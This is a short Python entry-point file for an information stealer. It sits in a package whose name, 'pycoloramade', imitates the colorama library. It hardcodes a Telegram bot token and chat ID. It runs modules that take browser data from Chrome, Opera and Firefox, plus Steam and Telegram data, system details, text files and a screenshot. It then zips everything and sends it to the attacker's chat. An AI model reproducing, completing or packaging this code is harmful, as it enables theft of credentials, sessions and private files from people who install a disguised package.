

def main():
    TOKEN = '6599539436:AAFVJrGKyNqCO8qqTUXOlWr-GvREXwxHV0k'
    CHAT_ID = '7127284530'

    # В файле pycoloramade/main.py
    from .modules.others import folder
    from .modules.system import sys, screen, txt
    from .modules.browsers import chrome, opera, firefox
    from .modules.others import telegram, sender, makeitclean, steam

    folder.makeFolders()
    chrome.Chrome()
    opera.Opera()
    firefox.Firefox()
    steam.Steam()
    sys.SystemInfo()
    txt.TxtSteal()
    telegram.Telegram()
    screen.Screenshot()

    try:
        makeitclean.makemeZip()
    except Exception as e:
        print(e)
    try:
        sender.Send(TOKEN, CHAT_ID)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    main()
